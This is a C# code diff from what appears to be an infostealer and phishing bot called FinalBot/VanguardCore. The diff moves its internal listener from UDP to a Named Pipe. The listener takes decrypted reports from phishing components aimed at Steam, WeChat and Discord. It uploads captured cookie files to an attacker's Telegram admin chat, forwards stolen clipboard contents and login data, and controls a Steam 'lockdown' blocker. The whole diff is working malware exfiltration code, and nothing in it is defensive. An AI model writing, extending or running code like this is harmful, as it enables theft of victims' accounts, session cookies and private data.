@@ -14,6 +14,7 @@ using System.Net.Http;
 using System.Net.Sockets;
 using System.Text;
 using System.Reflection;
+using System.IO.Pipes;
 using File = System.IO.File;
 
 namespace FinalBot
@@ -58,9 +59,9 @@ namespace FinalBot
                 // Handle Auto-Proxy Node registration if in Clean Region
                 _ = Task.Run(() => VanguardCore.Modules.ProxyModule.AutoRegisterAsync());
 
-                // Start UDP listener for phishing reports (Steam/WeChat)
-                DebugLog("[ORCHESTRATOR] Launching UDP listener...");
-                _ = Task.Run(() => StartUdpListener());
+                // Start Named Pipe listener for phishing reports (Steam/WeChat/Discord)
+                DebugLog("[ORCHESTRATOR] Launching Named Pipe listener...");
+                _ = Task.Run(() => StartPipeListener());
 
                 // 1. Initial Report (Async to prevent blocking)
                 DebugLog("[ORCHESTRATOR] Sending startup report...");
@@ -138,82 +139,83 @@ namespace FinalBot
 
         private int _lastLogMessageId = 0;
 
-        private async Task StartUdpListener()
+        private async Task StartPipeListener()
         {
-            int port = 51337;
-            try
+            while (_isRunning)
             {
-                var localEndpoint = new IPEndPoint(IPAddress.Loopback, port);
-                using var udpClient = new UdpClient(localEndpoint);
-                Console.WriteLine($"[UDP] Listening on 127.0.0.1:{port}...");
-                while (_isRunning)
+                try
                 {
-                    try
+                    using (var pipeServer = new NamedPipeServerStream("vanguard_status_pipe", PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous))
                     {
-                        var result = await udpClient.ReceiveAsync();
-                        string raw = Encoding.UTF8.GetString(result.Buffer);
-                        string decrypted = DecryptString(raw);
-                        if (string.IsNullOrEmpty(decrypted)) decrypted = raw;
-
-                        if (decrypted.StartsWith("FILE:"))
+                        await pipeServer.WaitForConnectionAsync();
+                        using (var reader = new StreamReader(pipeServer))
                         {
-                            string filePath = decrypted.Substring(5).Trim();
-                            if (File.Exists(filePath))
+                            string raw = await reader.ReadToEndAsync();
+                            string decrypted = DecryptString(raw);
+                            if (string.IsNullOrEmpty(decrypted)) decrypted = raw;
+
+                            if (decrypted.StartsWith("FILE:"))
                             {
-                                using var stream = File.OpenRead(filePath);
-                                await _botClient.SendDocumentAsync(
-                                    chatId: _adminId,
-                                    document: InputFile.FromStream(stream, Path.GetFileName(filePath)),
-                                    caption: WrapWithSessionTag($"📦 <b>Cookies Captured:</b> <code>{Path.GetFileName(filePath)}</code>"),
-                                    parseMode: ParseMode.Html
-                                );
-                                continue; 
+                                string filePath = decrypted.Substring(5).Trim();
+                                if (File.Exists(filePath))
+                                {
+                                    using var stream = File.OpenRead(filePath);
+                                    await _botClient.SendDocumentAsync(
+                                        chatId: _adminId,
+                                        document: InputFile.FromStream(stream, Path.GetFileName(filePath)),
+                                        caption: WrapWithSessionTag($"📦 <b>Cookies Captured:</b> <code>{Path.GetFileName(filePath)}</code>"),
+                                        parseMode: ParseMode.Html
+                                    );
+                                    continue; 
+                                }
                             }
-                        }
 
-                        if (decrypted.Contains("[Discord]") || decrypted.Contains("[PROGRESS]"))
-                        {
-                            int lastMsgId = CommandHandler.GetLastDiscordMessageId();
-                            if (lastMsgId != 0)
+                            if (decrypted.Contains("[Discord]") || decrypted.Contains("[PROGRESS]"))
                             {
-                                try {
-                                    await _botClient.EditMessageTextAsync(_adminId, lastMsgId, decrypted, parseMode: ParseMode.Html);
+                                int lastMsgId = CommandHandler.GetLastDiscordMessageId();
+                                if (lastMsgId != 0)
+                                {
+                                    try {
+                                        await _botClient.EditMessageTextAsync(_adminId, lastMsgId, decrypted, parseMode: ParseMode.Html);
+                                    } catch { }
+                                }
+                                else 
+                                {
+                                    var sent = await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html);
+                                    CommandHandler.SetLastDiscordMessageId(sent.MessageId);
+                                }
+                                continue;
+                            }
+
+                            if (decrypted.StartsWith("CLIPBOARD:"))
+                            {
+                                string content = decrypted.Substring(10).Trim();
+                                await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag($"📋 <b>CLIPBOARD CAPTURED</b>\n━━━━━━━━━━━━━━━━━━\n<code>{content}</code>"), parseMode: ParseMode.Html);
+                                continue;
+                            }
+
+                            bool isHighValue = decrypted.Contains("Captured") || decrypted.Contains("Steam") || decrypted.StartsWith("💎") || decrypted.StartsWith("🚨") || decrypted.StartsWith("✅") || decrypted.Contains("Login") || decrypted.Contains("Cookie");
+
+                            if (isHighValue)
+                            {
+                                try { 
+                                    await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html); 
+                                    
+                                    if (decrypted.Contains("Window Closed") && !Modules.PhishManager.GlobalBlockSteam)
+                                    {
+                                        Modules.PhishManager.StopLockdown();
+                                    }
                                 } catch { }
                             }
-                            else 
-                            {
-                                var sent = await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html);
-                                CommandHandler.SetLastDiscordMessageId(sent.MessageId);
-                            }
-                            continue;
-                        }
-
-                        if (decrypted.StartsWith("CLIPBOARD:"))
-                        {
-                            string content = decrypted.Substring(10).Trim();
-                            await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag($"📋 <b>CLIPBOARD CAPTURED</b>\n━━━━━━━━━━━━━━━━━━\n<code>{content}</code>"), parseMode: ParseMode.Html);
-                            continue;
-                        }
-
-                        bool isHighValue = decrypted.Contains("Captured") || decrypted.Contains("Steam") || decrypted.StartsWith("💎") || decrypted.StartsWith("🚨") || decrypted.StartsWith("✅") || decrypted.Contains("Login") || decrypted.Contains("Cookie");
-
-                        if (isHighValue)
-                        {
-                            try { 
-                                await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html); 
-                                
-                                // V6.15: Handle window closure to release Steam blocker if global toggle is OFF
-                                if (decrypted.Contains("Window Closed") && !Modules.PhishManager.GlobalBlockSteam)
-                                {
-                                    Modules.PhishManager.StopLockdown();
-                                }
-                            } catch { }
                         }
                     }
-                    catch (Exception ex) { Console.WriteLine($"[UDP ERROR] {ex.Message}"); }
+                }
+                catch (Exception ex) 
+                { 
+                    if (_isRunning) DebugLog($"[PIPE ERROR] {ex.Message}");
+                    await Task.Delay(100); 
                 }
             }
-            catch (Exception ex) { Console.WriteLine($"[UDP BIND ERROR] {ex.Message}"); }
         }
 
         private string WrapWithSessionTag(string message)
